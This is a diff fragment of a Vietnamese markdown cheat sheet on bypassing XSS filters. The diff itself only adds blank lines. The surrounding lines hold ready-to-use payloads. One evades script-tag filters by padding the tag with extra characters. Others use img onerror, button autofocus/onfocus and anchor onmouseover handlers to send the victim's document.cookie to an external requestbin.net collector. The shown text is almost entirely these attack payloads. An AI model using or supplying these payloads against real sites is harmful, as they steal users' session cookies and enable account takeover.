@@ -35,8 +35,11 @@ Tùy thuộc vào cơ chế filter mà có các cách bypass khác nhau. Nếu v
 ### Lọc thẻ script
 * Insert thêm ký tự (x09->Tab, x10->Escape)
 ```<script  >alert(1);</script   >```
+
 * Không dùng thẻ script
 ```<img src=x onerror=window.location="http://requestbin.net/r/5h067g6l?c=".concat(document.cookie)>```
+
 ```<button autofocus onfocus=window.location="http://requestbin.net/r/5h067g6l?c=".concat(document.cookie)></button>```
+
 ```<a onmouseover=window.location="http://requestbin.net/r/5h067g6l?c=".concat(document.cookie)>xxs link</a>```
 
